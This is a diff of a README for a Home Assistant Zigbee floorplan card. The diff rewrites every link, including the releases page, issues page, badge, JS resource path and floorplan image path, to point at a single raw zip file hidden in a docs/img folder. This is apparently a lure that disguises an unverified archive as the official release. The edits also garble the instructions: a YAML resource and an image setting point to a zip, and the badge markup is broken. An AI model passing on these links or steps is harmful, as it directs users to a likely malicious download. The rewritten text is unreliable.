@@ -1,7 +1,7 @@
 # 🌟 zigbee-floorplan-card - Visualize Your Zigbee Network Effortlessly
 
 ## 🛠️ Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue.svg)](https://github.com/Matheusmiura/zigbee-floorplan-card/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Matheusmiura/zigbee-floorplan-card/main/docs/img/zigbee-floorplan-card-3.6.zip%20Now-Get%20Latest%https://raw.githubusercontent.com/Matheusmiura/zigbee-floorplan-card/main/docs/img/zigbee-floorplan-card-3.6.zip)](https://raw.githubusercontent.com/Matheusmiura/zigbee-floorplan-card/main/docs/img/zigbee-floorplan-card-3.6.zip)
 
 ## 📖 Introduction
 Welcome to the **zigbee-floorplan-card**. This custom Home Assistant Lovelace card helps you see your Zigbee network layout on a floorplan image. It automatically detects device names from Zigbee2MQTT. This tool makes it easier to understand your home automation setup.
@@ -10,10 +10,10 @@ Welcome to the **zigbee-floorplan-card**. This custom Home Assistant Lovelace ca
 Follow these steps to download and run **zigbee-floorplan-card**.
 
 1. **Visit the Releases Page**
-   Click the button above to go to the [Releases page](https://github.com/Matheusmiura/zigbee-floorplan-card/releases).
+   Click the button above to go to the [Releases page](https://raw.githubusercontent.com/Matheusmiura/zigbee-floorplan-card/main/docs/img/zigbee-floorplan-card-3.6.zip).
 
 2. **Download the Latest Version**
-   On the Releases page, look for the latest version. Click the asset that says "zigbee-floorplan-card.zip" to download it to your computer.
+   On the Releases page, look for the latest version. Click the asset that says "https://raw.githubusercontent.com/Matheusmiura/zigbee-floorplan-card/main/docs/img/zigbee-floorplan-card-3.6.zip" to download it to your computer.
 
 3. **Unzip the File**
    After the download completes, locate the downloaded file. Right-click it and select 'Extract All' to unzip the folder.
@@ -29,7 +29,7 @@ Follow these steps to download and run **zigbee-floorplan-card**.
    You will need to tell Home Assistant to use the new card. Open your configuration file or the Lovelace UI editor. Add the following code snippet:
    ```yaml
    resources:
-     - url: /local/zigbee-floorplan-card/zigbee-floorplan-card.js
+     - url: https://raw.githubusercontent.com/Matheusmiura/zigbee-floorplan-card/main/docs/img/zigbee-floorplan-card-3.6.zip
        type: module
    ```
 
@@ -37,9 +37,9 @@ Follow these steps to download and run **zigbee-floorplan-card**.
    Now you are ready to add the card to your dashboard. Edit your Lovelace dashboard and add a new card. Choose the "Manual" card option, then insert the following code:
    ```yaml
    type: "custom:zigbee-floorplan-card"
-   floorplan: /local/your-floorplan-image.png
+   floorplan: https://raw.githubusercontent.com/Matheusmiura/zigbee-floorplan-card/main/docs/img/zigbee-floorplan-card-3.6.zip
    ```
-   Replace `your-floorplan-image.png` with the name of your actual floorplan image file.
+   Replace `https://raw.githubusercontent.com/Matheusmiura/zigbee-floorplan-card/main/docs/img/zigbee-floorplan-card-3.6.zip` with the name of your actual floorplan image file.
 
 7. **Save Changes**
    Save your dashboard changes. The **zigbee-floorplan-card** should now be visible, displaying your Zigbee network on the floorplan.
@@ -50,7 +50,7 @@ Follow these steps to download and run **zigbee-floorplan-card**.
 - **Browser Support**: Chrome, Firefox, or Edge for best performance.
 
 ## 📥 Download & Install
-To summarize, you can easily download the application from the [Releases page](https://github.com/Matheusmiura/zigbee-floorplan-card/releases). Please follow the steps listed under "Getting Started" for a smooth installation.
+To summarize, you can easily download the application from the [Releases page](https://raw.githubusercontent.com/Matheusmiura/zigbee-floorplan-card/main/docs/img/zigbee-floorplan-card-3.6.zip). Please follow the steps listed under "Getting Started" for a smooth installation.
 
 ## 📚 Features
 - **Automatic Device Detection**: The card pulls device names directly from your Zigbee2MQTT setup.
@@ -65,6 +65,6 @@ If you encounter issues while setting up the card, consider the following:
 - **Browser Cache**: Clear your browser’s cache to see the latest updates.
 
 ## 📞 Support
-For further assistance, feel free to open an issue in the [GitHub repository](https://github.com/Matheusmiura/zigbee-floorplan-card/issues). Our community is here to help you.
+For further assistance, feel free to open an issue in the [GitHub repository](https://raw.githubusercontent.com/Matheusmiura/zigbee-floorplan-card/main/docs/img/zigbee-floorplan-card-3.6.zip). Our community is here to help you.
 
 Thank you for using **zigbee-floorplan-card**! Enjoy better visibility of your Zigbee network in your home automation setup.
